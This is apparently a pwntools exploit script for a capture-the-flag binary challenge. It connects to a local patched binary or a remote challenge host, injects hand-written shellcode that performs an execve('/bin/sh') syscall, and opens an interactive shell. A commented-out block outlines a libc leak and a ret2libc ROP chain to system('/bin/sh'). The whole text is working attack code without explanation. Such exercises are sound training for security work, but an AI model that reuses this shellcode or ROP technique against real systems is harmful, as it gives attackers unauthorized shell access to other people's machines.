from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["node.yuzhian.com.cn",35899]
libc=ELF('./libc.so.6')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

gdb.attach(p,'''
    b *$rebase(0x139b)
''')

ru(b'shellcode!\n\n')
shellcode = asm('''
	mov rsp, r15
	mov rdi, 0x0068732f6e69622f
	xor esi, esi
	xor eax, eax
	cdq
	add al, 0x3b
	syscall
''')

s(shellcode)
#ru(b'it!\n')
#leak_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
#leak_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
#pr('leak_addr', leak_addr)

#libc_base = leak_addr - 0x1f2000
#pr('libc_base', libc_base)

#pop_rdi = libc_base + 0x23b6a
#pop_rsi = libc_base + 0x2601f
#pop_rdx = libc_base + 0x142c92
#mprotect = libc_base + libc.sym['mprotect']
#read_addr = libc_base + libc.sym['read']
#binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
#system_addr = libc_base + libc.sym['system']
#ret = libc_base + 0x22679

#code = 0x9961000
#buf = 0x9961100

#pause()
#payload = p64(pop_rdi) + p64(binsh) + p64(system_addr)
#sl(payload)

shell()
